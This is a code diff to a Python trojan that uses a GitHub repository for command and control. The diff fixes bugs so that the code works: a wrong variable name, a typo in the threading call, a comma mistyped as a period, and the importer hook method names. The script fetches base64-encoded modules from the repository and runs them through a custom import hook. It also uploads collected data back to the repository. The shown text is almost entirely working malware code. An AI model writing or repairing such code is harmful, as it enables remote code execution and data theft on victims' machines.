@@ -16,7 +16,7 @@ def connectToGithub():
 
 	user = 'Z2l0aHVi-TEST'
 	sess = github3.login(token = token)
-	return sess.repository(usr, 'gitControlledTrojan')
+	return sess.repository(user, 'gitControlledTrojan')
 
 def getFileContents(dirname, module_name, repo):
 
@@ -51,7 +51,7 @@ class Trojan:
 		curr_time = datetime.now().isoformat()
 		remote_path = f'data/{self.id0}/{curr_time}.data'
 		bindata = bytes('%r' % data, 'utf-8')
-		self.repo.create_file(remote_path. curr_time, base64.b64encode(bindata))
+		self.repo.create_file(remote_path, curr_time, base64.b64encode(bindata))
 
 	def run(self):
 
@@ -59,10 +59,10 @@ class Trojan:
 
 			config = self.getConfig()
 			for task in config:
-				thread = threading.Tread(target = self.moduleRunner, args = (task['module'],))
+				thread = threading.Thread(target = self.moduleRunner, args = (task['module'],))
 				thread.start()
 				time.sleep(random.randint(1, 10))
-			time.sleep(10)
+			time.sleep(10*60)
 
 class GitImporter:
 
@@ -70,7 +70,7 @@ class GitImporter:
 
 		self.current_module_code = ''
 
-	def findModule(self, name, path = None):
+	def find_module(self, name, path = None):
 
 		print(f"[+] Attempting to retrieve {name}...")
 		self.repo = connectToGithub()
@@ -80,7 +80,7 @@ class GitImporter:
 			self.current_module_code = base64.b64decode(new_library)
 			return self
 
-	def loadModule(self, name):
+	def load_module(self, name):
 
 		spec = importlib.util.spec_from_loader(name, loader = None, origin = self.repo.git_url)
 		new_module = importlib.util.module_from_spec(spec)
@@ -91,5 +91,5 @@ class GitImporter:
 if __name__ == '__main__':
 	
 	sys.meta_path.append(GitImporter())
-	trojan = Trojan('abc')
+	trojan = Trojan('abcd')
 	trojan.run()
